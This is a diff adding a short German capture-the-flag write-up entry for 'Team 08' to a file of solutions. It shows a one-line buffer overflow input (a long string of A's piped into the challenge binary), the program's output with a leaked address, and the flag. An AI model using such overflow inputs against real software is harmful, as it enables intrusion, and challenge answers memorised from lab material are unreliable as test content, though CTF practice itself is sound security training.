@@ -497,6 +497,23 @@ erhalten wir die Flag.
 ## Flag  
 FLAG{LuckyNumberSlevin}
 ```
+```
+# Team 08
+Flag
+FLAG{Format Is Important}
+
+Notiz
+War das so angedacht?
+
+Beschreibung:
+Ein simpler Bufferoverflow, der dazu führt, dass ein Check erfüllt wird. Es wird kein bestimmter Wert geprüft, wir nehmen deswegen einfach einen Haufen A's:
+
+echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ./team_08
+
+You shall not pass!
+Psst, don't look: 0x56455de0071a
+Did you hear something?FLAG{Format Is Important}
+```
 # Team 7 
 ```
 
